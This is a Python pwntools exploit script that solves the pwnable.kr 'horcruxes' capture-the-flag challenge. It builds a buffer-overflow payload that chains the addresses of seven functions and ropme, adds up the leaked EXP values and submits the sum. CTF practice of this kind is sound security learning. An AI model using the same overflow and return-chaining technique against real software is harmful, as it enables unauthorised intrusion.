#!/usr/bin/python3

from pwn import *

exe = ELF('./horcruxes', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwnable.kr', 9032)
else:
        p = process(exe.path)

# GDB()
func_A = 0x809fe4b
func_B = 0x809fe6a
func_C = 0x809fe89
func_D = 0x809fea8
func_E = 0x809fec7
func_F = 0x809fee6
func_G = 0x809ff05
ropme = 0x0809fffc
p.sendline("0")

 
payload = b"a" * 120
payload += p32(exe.sym.A)
payload += p32(exe.sym.B)
payload += p32(exe.sym.C)
payload += p32(exe.sym.D)
payload += p32(exe.sym.E)
payload += p32(exe.sym.F)
payload += p32(exe.sym.G)
payload += p32(0x0809fffc)
sla(b"earned? :", payload)
 
t=0
for i in range(0,7):
    p.recvuntil('EXP +')
    t += int(p.recvuntil(')')[:-1])
 
p.recvuntil("u:")
p.sendline("1")
p.recvuntil("? : ")
p.sendline(str(t))
p.interactive()
